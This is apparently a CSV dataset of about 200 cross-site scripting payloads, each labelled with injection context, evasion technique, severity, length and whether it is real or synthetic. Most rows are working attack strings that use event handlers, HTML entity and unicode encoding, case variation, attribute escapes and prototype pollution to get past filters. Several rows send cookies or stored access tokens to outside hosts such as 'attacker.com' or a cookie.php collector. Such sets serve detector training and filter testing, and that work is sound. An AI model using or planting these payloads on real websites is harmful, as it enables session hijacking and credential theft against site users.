payload,context,technique,severity,length,source
document.body.innerHTML=%22<img src=x onerror=XMLHttpRequest(localStorage.getItem(%27token%27))>%22,dom_sink,synthetic,high,99,synthetic
onanimationstart=\u0061lert/***/('XSS'),event_handler,synthetic,low,39,synthetic
"<aside oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,99,real
	onch&#97;ng&#101;=&#97;l&#101;rt(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,59,synthetic
oninput=prompt/*x*/(%27XSS%27),event_handler,synthetic,low,30,synthetic
' ><svG oNpaSte=coNsoLe.Log(doCumEnt.doMaiN)>,attribute_escape,synthetic,medium,45,synthetic
"<img usemap=#x><map name=""x""><area href onfocus=alert(1) id=x>",tag_injection,none,medium,62,real
`><img src=x onkeypress=confirm('XSS')>,attribute_escape,synthetic,medium,39,synthetic
&quot;&gt;&lt;SVG ONLOAD=&amp;#97&amp;#108&amp;#101&amp;#114&amp;#116(&amp;#x64&amp;#x6f&amp;#x63&amp;#x75&amp;#x6d&amp;#x65&amp;#x6e&amp;#x74&amp;#x2e&amp;#x64&amp;#x6f&amp;#x6d&amp;#x61&amp;#x69&amp;#x6e)&gt;,event_handler,none,low,210,real
"""><input autofocus onfocus =top[(584390752*16).toString(32-1*2)](/AnonKryptiQuz/)>",tag_injection,none,low,82,real
i.contentWindow.alert(1);,dom_sink,none,medium,25,real
document.write(%22<img src=x onerror=fetch(document.domain)>%22),dom_sink,synthetic,high,64,synthetic
\%27 onpromptdismiss=prompt(location.hash)//,attribute_escape,synthetic,medium,44,synthetic
"LocAtiOn.HreF=""JavAscRipT:cOnfIrm(loCalStoRagE.gEtITem('tOkeN'))""",dom_sink,synthetic,high,65,synthetic
"<script>setTimeout('console.log(1)',0)</script>",script_injection,synthetic,medium,47,synthetic
"<SCRIPT>document.write(""XSS"");</SCRIPT>",dom_sink,case_variation,low,39,real
%3Cscript	%3Eprompt(document.domain)%3C/script%3E,script_injection,synthetic,medium,49,synthetic
' onmouseover=console.log('XSS') ',attribute_escape,synthetic,medium,34,synthetic
eval(%22XMLHttpRequest(location.hash)%22),dom_sink,synthetic,high,41,synthetic
'><ScrIpt>coNsoLe.Log(doCumEnt.doMaiN)</scRipT>,script_injection,synthetic,medium,47,synthetic
%3Cxss onend=prompt('XSS')/%3E,tag_injection,synthetic,medium,30,synthetic
"<spacer onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</spacer>",tag_injection,none,medium,74,real
<b&#97;s&#101;	onb&#101;for&#101;copy=consol&#101;.log(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,low,78,synthetic
""" ><svg onpointerrawupdate=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,66,synthetic
"setTimeout(""console.log('//attacker.com/?c='+document.cookie)"",0)",dom_sink,synthetic,high,65,synthetic
onplaying=prompt/*x*/(document.domain),event_handler,synthetic,low,38,synthetic
"<script\x0Dtype=""text/javascript"">javascript:alert(7178);</script>",script_injection,none,medium,66,real
"<TABLE BACKGROUND=""javascript:alert(3412)"">",js_uri,case_variation,medium,43,real
<&#101;mb&#101;d/onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,101,synthetic
"<style>@keyframes x{}</style><content style=""animation-name:x"" onanimationend=""alert(1)""></content>",tag_injection,none,medium,99,real
"""><listing onpopst&#97;t&#101;=prompt(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,64,synthetic
"<style>@keyframes x{}</style><template style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></template>",tag_injection,none,medium,109,real
"""'><img src=xxx:x onerror\x0A=javascript:alert(2357)>",js_uri,none,medium,53,real
"""><img src=x ondragenter=console.log(1)>",attribute_escape,synthetic,medium,40,synthetic
"<rt onmousedown=""alert(1)"">AnonKryptiQuz</rt>",tag_injection,none,medium,45,real
%22 ongestureend=alert(1) %22,attribute_escape,synthetic,medium,29,synthetic
"<style>:target {transform: rotate(180deg);}</style><kbd id=x style=""transition:transform 2s"" ontransitionrun=print()></kbd>",tag_injection,none,low,123,real
"<summary onmouseout=""alert(1)"" style=display:block>AnonKryptiQuz</summary>",tag_injection,none,medium,74,real
%3Cscript	%3Ealert('XSS')%3C/script%3E,script_injection,synthetic,medium,38,synthetic
"<form ondblclick=""alert(1)"" autofocus tabindex=1 style=display:block>AnonKryptiQuz</form>",tag_injection,none,medium,89,real
"<style>@keyframes slidein {}</style><bdi style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></bdi>",tag_injection,none,medium,166,real
%27 ><svg onanimationcancel=confirm(location.hash)>,attribute_escape,synthetic,medium,51,synthetic
%3C!--%3E%3Cembed onmozfullscreenchange=console.log(document.domain)%3E,tag_injection,synthetic,medium,71,synthetic
"<datalist onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</datalist>",tag_injection,none,medium,91,real
"<style></style\x0A<img src=""about:blank"" onerror=javascript:alert(1)//></style>",js_uri,none,medium,79,real
"<style>@keyframes x{}</style><thead style=""animation-name:x"" onanimationstart=""alert(1)""></thead>",tag_injection,none,medium,97,real
<titl&#101; src=x onmozfullscr&#101;&#101;nch&#97;ng&#101;=prompt('XSS')>,tag_injection,synthetic,medium,73,synthetic
'><Img srC=x onFocUsoUt=ConSolE.lOg(LocAtiOn.HasH)>,attribute_escape,synthetic,medium,51,synthetic
<b&#97;s&#101;	ong&#101;stur&#101;&#101;nd=consol&#101;.log(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,86,synthetic
' ><svG oNweBkiTfuLlsCreEncHanGe=AleRt('XSS')>,attribute_escape,synthetic,medium,46,synthetic
<video contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,tag_injection,none,medium,59,real
onanimationend=console.log('XSS'),event_handler,synthetic,medium,33,synthetic
"<audio draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</audio>",tag_injection,none,medium,68,real
"""%3E%3Cform onreset=console.log(document.domain)%3E",tag_injection,synthetic,medium,51,synthetic
"%3Cxmp src=x onfocusout=prompt(String.fromCharCode(88,83,83))%3E",tag_injection,synthetic,high,64,synthetic
"<var onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</var>",tag_injection,none,medium,81,real
<arEa OnlOad=coNsoLe.Log(doCumEnt.doMaiN) OnlOad=coNsoLe.Log(doCumEnt.doMaiN)>,tag_injection,synthetic,medium,78,synthetic
__proto__[%22ontouchmove%22]=prompt(%27XSS%27),dom_sink,synthetic,medium,46,synthetic
<script	>confirm('XSS')</script>,script_injection,synthetic,medium,32,synthetic
{prompt document.cookie},template_injection,synthetic,high,24,synthetic
onfocus=\u0061lert&#40;location.hash&#41;,event_handler,synthetic,low,41,synthetic
"\' OnpOinTerUp=ConFirM(STriNg.FroMChArCOde(88,83,83))//",attribute_escape,synthetic,high,55,synthetic
"<div draggable=""true"" contenteditable>drag me</div><plaintext ondragover=alert(1) contenteditable>drop here</plaintext>",tag_injection,none,medium,119,real
OnbEfoRepAstE=cOnsOle.loG(dOcuMenT.dOmaIn),event_handler,synthetic,medium,42,synthetic
"<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",script_injection,html_entity,low,149,real
window[%22XMLHttpRequest%22](document.cookie),dom_sink,synthetic,high,45,synthetic
""" oNinPut=alErt(doCumEnt.doMaiN) """,attribute_escape,synthetic,medium,34,synthetic
"\' onerror=\u0061lert(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,54,synthetic
JAVASCRIPT:alert(%27XSS%27),js_uri,synthetic,medium,27,synthetic
"__proto__[""onvolum&#101;ch&#97;ng&#101;""]=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)",dom_sink,synthetic,low,79,synthetic
'+confirm(9)&&null==',attribute_escape,none,medium,21,real
"\%27 onfocus=console.log(String.fromCharCode(88,83,83))//",attribute_escape,synthetic,high,57,synthetic
<image3 onpointerover=alert(1) style=display:block>AnonKryptiQuz</image3>,tag_injection,none,medium,73,real
"<br onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</br>",tag_injection,none,medium,61,real
"<a href=""\xE2\x80\x81javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,79,real
"<hgroup onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</hgroup>",tag_injection,none,medium,74,real
"\"" onrepeat=alert(location.hash)//",attribute_escape,synthetic,medium,34,synthetic
"\"" onpageshow=console.log(location.hash)//",attribute_escape,synthetic,medium,42,synthetic
""" %3E%3Csvg onblur=alert(location.hash)%3E",attribute_escape,synthetic,medium,42,synthetic
"<u onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</u>",tag_injection,none,medium,55,real
?__proto__[transport_url]=%3C%2fscript%3E%3Cscript%3Ealert(document.cookie)%3C%2fscript%3Eivl0w,dom_sink,url_encoding,high,95,real
<link x=y oninput=&#97;l&#101;rt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,low,59,synthetic
"&#101;l&#101;m&#101;nt.s&#101;tAttribut&#101;(""onclick"",""prompt('XSS')"")",dom_sink,synthetic,medium,72,synthetic
eval(630038579..toString(30))(1),dom_sink,encoding,low,32,real
"<tfoot id=x style=""transition:outline 1s"" ontransitionend=alert(1) tabindex=1></tfoot>",tag_injection,none,medium,86,real
<&#97;nim&#97;t&#101;tr&#97;nsform onpoint&#101;rmov&#101;=consol&#101;.log('XSS') onpoint&#101;rmov&#101;=consol&#101;.log('XSS')>,tag_injection,synthetic,low,131,synthetic
<img src=x onkeypress=console.log(1)>,tag_injection,synthetic,medium,37,synthetic
"&quot; onbeforetoggle=\u0061lert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,72,synthetic
"<frame oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</frame>",tag_injection,none,medium,73,real
%27><img src=x onend=confirm(%27XSS%27)>,attribute_escape,synthetic,medium,40,synthetic
""" oNerRor=coNfiRm(LocAtiOn.HasH) """,attribute_escape,synthetic,medium,34,synthetic
"&lt;BR SIZE=\""&{alert('AnonKryptiQuz')}\""&gt;",generic,none,medium,45,real
<link onfocusout=alert(1) autofocus tabindex=1 style=display:block>AnonKryptiQuz</link><input value=clickme>,tag_injection,none,medium,108,real
"""><img src=x onmouseover=prompt(\u0064ocument.domain);>",tag_injection,unicode_escape,medium,55,real
<iframe2 onpointerleave=alert(1) style=display:block>AnonKryptiQuz</iframe2>,tag_injection,none,medium,76,real
<select onanimationstart=prompt(%27XSS%27) onanimationstart=prompt(%27XSS%27)>,tag_injection,synthetic,medium,78,synthetic
&quot; onended=alert(1) x=&quot;,attribute_escape,synthetic,medium,32,synthetic
<summary onpointermove=alert(1) style=display:block>AnonKryptiQuz</summary>,tag_injection,none,medium,75,real
"docum&#101;nt.qu&#101;ryS&#101;l&#101;ctor(""body"").inn&#101;rHTML+=""&#97;l&#101;rt(loc&#97;lStor&#97;g&#101;.g&#101;tIt&#101;m('tok&#101;n'))""",dom_sink,synthetic,low,142,synthetic
'><img src=x onr&#101;s&#101;t=consol&#101;.log('XSS')>,attribute_escape,synthetic,low,55,synthetic
%3Cembed onmozfullscreenchange=console.log(document.domain) onmozfullscreenchange=console.log(document.domain)%3E,tag_injection,synthetic,medium,113,synthetic
"<div draggable=""true"" contenteditable>drag me</div><progress ondragover=alert(1) contenteditable>drop here</progress>",tag_injection,none,medium,117,real
%22 ongotpointercapture=console.log(%27XSS%27) %22,attribute_escape,synthetic,medium,50,synthetic
<obJecT oNsuBmiT=cOnfIrm(loCatIon.haSh)/>,tag_injection,synthetic,medium,41,synthetic
"<style>:target {transform: rotate(180deg);}</style><br id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></br>",tag_injection,none,medium,122,real
OnlOad=jaVasCriPt:ConSolE.lOg(DocUmeNt.DomAin),event_handler,synthetic,medium,46,synthetic
ongotpointercapture=console.log(%27XSS%27),event_handler,synthetic,medium,42,synthetic
"setTimeout(""prompt('XSS')"",0)",dom_sink,synthetic,medium,29,synthetic
%3C!--%3E%3Cblink onkeypress=prompt(document.domain)%3E,tag_injection,synthetic,medium,55,synthetic
<a2 onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</a2><input value=clickme>,tag_injection,none,medium,95,real
"OndRagOveR=pRomPt/*x*/(STriNg.FroMChArCOde(88,83,83))",event_handler,synthetic,high,53,synthetic
"<div draggable=""true"" contenteditable>drag me</div><dd ondragover=alert(1) contenteditable>drop here</dd>",tag_injection,none,medium,105,real
OneNd=AleRt&#40;1&#41;,event_handler,synthetic,low,22,synthetic
""" ><svg ontransitionend=alert(document.domain)>",attribute_escape,synthetic,medium,47,synthetic
<audio/onpopstate=confirm(location.hash)>,tag_injection,synthetic,medium,41,synthetic
%27 ontouchmove=alert(location.hash) %27,attribute_escape,synthetic,medium,40,synthetic
"""%3E%3Cimg src=x ondragenter=prompt(document.domain)%3E",attribute_escape,synthetic,medium,55,synthetic
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out,generic,none,medium,108,real
`><img src=x onended=alert('XSS')>,attribute_escape,synthetic,medium,34,synthetic
"<blockquote onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</blockquote>",tag_injection,none,medium,96,real
"<script>new Image().src=""http://localhost/cookie.php?c=""+localStorage.getItem('access_token');</script>",dom_sink,none,high,103,real
"<style>:target {color: red;}</style><image3 id=x style=""transition:color 10s"" ontransitioncancel=print()></image3>",tag_injection,none,low,114,real
"<shadow draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</shadow>",tag_injection,none,medium,68,real
"&quot; onscroll&#101;nd=&#97;l&#101;rt(String.fromCh&#97;rCod&#101;(88,83,83)) x=&quot;",attribute_escape,synthetic,low,87,synthetic
""" ong&#101;stur&#101;&#101;nd=consol&#101;.log(loc&#97;tion.h&#97;sh) """,attribute_escape,synthetic,low,71,synthetic
"<mark onmouseup=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,47,real
"loc&#97;tion.hr&#101;f=""j&#97;v&#97;script:XMLHttpR&#101;qu&#101;st(n&#97;vig&#97;tor.s&#101;ndB&#101;&#97;con('//&#97;tt&#97;ck&#101;r.com',docum&#101;nt.cooki&#101;))""",dom_sink,synthetic,high,169,synthetic
<obJecT oNanImaTioNcaNceL=aLerT(dOcuMenT.dOmaIn)/>,tag_injection,synthetic,medium,50,synthetic
&quot; ondragstart=confirm(1) x=&quot;,attribute_escape,synthetic,medium,38,synthetic
"<mark onmouseenter=""alert(1)"">AnonKryptiQuz</mark>",tag_injection,none,medium,50,real
\' OngEstUreEnd=prOmpT(1)//,attribute_escape,synthetic,medium,27,synthetic
'%3E%3Cimg src=x onhashchange=confirm(document.domain)%3E,attribute_escape,synthetic,medium,57,synthetic
document.getElementById('btn').onclick = function(e){,dom_sink,none,low,53,real
""" onfocus=prompt(docum&#101;nt.dom&#97;in) &#97;utofocus=""",attribute_escape,synthetic,medium,58,synthetic
"<u draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</u>",tag_injection,none,medium,58,real
' on&#97;uxclick=prompt(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,48,synthetic
onend=console.log(1),event_handler,synthetic,medium,20,synthetic
' ><svg onerror=\u0061lert(1)>,attribute_escape,synthetic,low,30,synthetic
' %3E%3Csvg onbeforematch=alert('XSS')%3E,attribute_escape,synthetic,medium,41,synthetic
%22 ><svg ondrop=confirm(document.domain)>,attribute_escape,synthetic,medium,42,synthetic
<blink onk&#101;ypr&#101;ss=prompt(docum&#101;nt.dom&#97;in)>,tag_injection,synthetic,medium,61,synthetic
"__proto__[""onk&#101;ypr&#101;ss""]=XMLHttpR&#101;qu&#101;st(1)",dom_sink,synthetic,high,61,synthetic
%3cscript%3ealert('XSS')%3c/script%3e,generic,url_encoding,medium,37,real
"<html onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</html>",tag_injection,none,medium,67,real
<xmp id=x tabindex=1 onfocus=alert(1)></xmp>,tag_injection,none,medium,44,real
"&quot; onfocus=console.log(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,66,synthetic
""" oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,high,55,synthetic
"""><template ondragenter=\u0061lert('XSS')>",tag_injection,synthetic,low,42,synthetic
"<style>:target {color:red;}</style><tbody id=x style=""transition:color 1s"" ontransitionend=alert(1)></tbody>",tag_injection,none,medium,108,real
"<div draggable=""true"" contenteditable>drag me</div><bdi ondragover=alert(1) contenteditable style=display:block>drop here</bdi>",tag_injection,none,medium,127,real
"%27 ><svg onpaste=confirm(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,57,synthetic
"' %3E%3Csvg onkeypress=console.log(String.fromCharCode(88,83,83))%3E",attribute_escape,synthetic,high,68,synthetic
"<div draggable=""true"" contenteditable>drag me</div><sub ondragover=alert(1) contenteditable style=display:block>drop here</sub>",tag_injection,none,medium,127,real
`><img src=x ontouchmove=alert(location.hash)>,attribute_escape,synthetic,medium,46,synthetic
"<video
ondragstart=alert('XSS')>",tag_injection,synthetic,medium,32,synthetic
'?prompt`AnonKryptiQuz`?',attribute_escape,none,low,25,real
"""><img src=x ontr&#97;nsitionrun=consol&#101;.log('XSS')>",attribute_escape,synthetic,low,57,synthetic
"<IMG """"""><SCRIPT>alert(""AnonKryptiQuz"")</SCRIPT>"">",script_injection,case_variation,medium,50,real
"<abbr onmouseleave=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,50,real
<acronym onpointermove=alert(1) style=display:block>AnonKryptiQuz</acronym>,tag_injection,none,medium,75,real
"<audio onmouseenter=""alert(1)"">AnonKryptiQuz</audio>",tag_injection,none,medium,52,real
" onscrollsnapchange=confirm(String.fromCharCode(88,83,83))",event_handler,synthetic,high,58,synthetic
"<animatetransform onkeypress=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</animatetransform>",tag_injection,none,medium,108,real
<marquee/onstart=c=String.fromCharCode;confirm(c(47)+c(88)+c(83)+c(83)+c(47))>,tag_injection,encoding,high,78,real
&quot; onpageshow=prompt(document.domain) x=&quot;,attribute_escape,synthetic,medium,50,synthetic
%27 ><svg onended=prompt(%27XSS%27)>,attribute_escape,synthetic,medium,36,synthetic
	onKeyDowN=pRomPt(LocAtiOn.HasH),event_handler,synthetic,medium,32,synthetic
<taBle	onSeaRch=prOmpT(1)>,tag_injection,synthetic,medium,26,synthetic
"<acronym onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</acronym>",tag_injection,none,medium,67,real
"<style>@keyframes slidein {}</style><spacer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></spacer>",tag_injection,none,medium,166,real
javascript:console.log(1),js_uri,synthetic,medium,25,synthetic
"element.setAttribute(""onclick"",""eval(document.domain)"")",dom_sink,synthetic,low,55,synthetic
&lt;SCRIPT&gt;alert(/AnonKryptiQuz/&#46;source)&lt;/SCRIPT&gt;,generic,html_entity,medium,62,real
onmozfullscr&#101;&#101;nch&#97;ng&#101;=consol&#101;.log(docum&#101;nt.dom&#97;in),event_handler,synthetic,low,83,synthetic
<animatetransform x=y onpointermove=console.log('XSS')>,tag_injection,synthetic,medium,55,synthetic
"&quot; oncopy=alert(String.fromCharCode(88,83,83)) x=&quot;",attribute_escape,synthetic,high,59,synthetic
"JAVASCRIPT:\u0061lert(String.fromCharCode(88,83,83))",js_uri,synthetic,high,52,synthetic
"<nextid draggable=""true"" ondragenter=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",tag_injection,none,medium,90,real
""" onpoint&#101;rmov&#101;=prompt('XSS') """,attribute_escape,synthetic,medium,41,synthetic
"<custom tags oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",tag_injection,none,medium,105,real
<script /**/>/**/alert(/AmoloHT/)/**/</script /**/,script_injection,comment_injection,medium,50,real
"<script>alert(document.domain.concat(""\n"").concat(window.origin))</script>",dom_sink,none,medium,74,real
"<nav onkeyup=""alert(1)"" contenteditable>AnonKryptiQuz</nav>",tag_injection,none,medium,59,real
<;SCRIPT>;alert(';XSS';)<;/SCRIPT>;,generic,none,medium,35,real
onpageshow=javascr	ipt:confirm(location.hash),event_handler,synthetic,medium,45,synthetic
<body oninput=javascript:alert(5675)><input autofocus>,js_uri,none,medium,54,real
"<em draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</em>",tag_injection,none,medium,60,real
"location=""javascr	ipt:fetch(navigator.sendBeacon('//attacker.com',document.cookie))""",dom_sink,synthetic,high,84,synthetic
%27><img src=x onsearch=alert(%27XSS%27)>,attribute_escape,synthetic,medium,41,synthetic
<tiTle/onStaLleD=aLerT('XSS')>,tag_injection,synthetic,medium,30,synthetic
{{alert('XSS')}},template_injection,synthetic,medium,16,synthetic
"<style>:target {color:red;}</style><source id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></source>",tag_injection,none,medium,116,real
"""""><img src=y onerror=confirm(1)>",tag_injection,none,medium,33,real
"location=""javascript:fetch(btoa(document.cookie))""",dom_sink,synthetic,high,50,synthetic
"<TABLE><TD BACKGROUND=""javascript:alert('XSS')"">",js_uri,case_variation,medium,48,real
"<abbr draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</abbr>",tag_injection,none,medium,66,real
"%22><img src=x oninvalid=prompt(String.fromCharCode(88,83,83))>",attribute_escape,synthetic,high,63,synthetic
<output onpointermove=alert(1) style=display:block>AnonKryptiQuz</output>,tag_injection,none,medium,73,real
"Obj&#101;ct.&#97;ssign(window,{""ontoggl&#101;"":XMLHttpR&#101;qu&#101;st})",dom_sink,synthetic,high,73,synthetic
%3Carea x=y onload=console.log(document.domain)%3E,tag_injection,synthetic,medium,50,synthetic
&quOt; onBefOrePasTe=AleRt('XSS') x=&quOt;,attribute_escape,synthetic,medium,42,synthetic
{{confirm(document.cookie)}},template_injection,synthetic,high,28,synthetic
&quOt; onPauSe=ConFirM('XSS') X=&QuoT;,attribute_escape,synthetic,medium,38,synthetic
"<embed onmouseup=""alert(1)"" style=display:block>AnonKryptiQuz</embed>",tag_injection,none,medium,69,real
"""><img src=x onpointerrawupdate=\u0061lert('XSS')>",attribute_escape,synthetic,low,50,synthetic
<textarea onscrollend=alert(%27XSS%27) onscrollend=alert(%27XSS%27)>,tag_injection,synthetic,medium,68,synthetic
' on&#101;rror=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,47,synthetic
onpagehide=prompt/*x*/(document.domain),event_handler,synthetic,low,39,synthetic
"__pRotO__[""oNcoPy""]=XMLHTtpReqUesT(dOcuMenT.dOmaIn)",dom_sink,synthetic,high,51,synthetic
%3Cxss/onend=prompt('XSS')%3E,tag_injection,synthetic,medium,29,synthetic
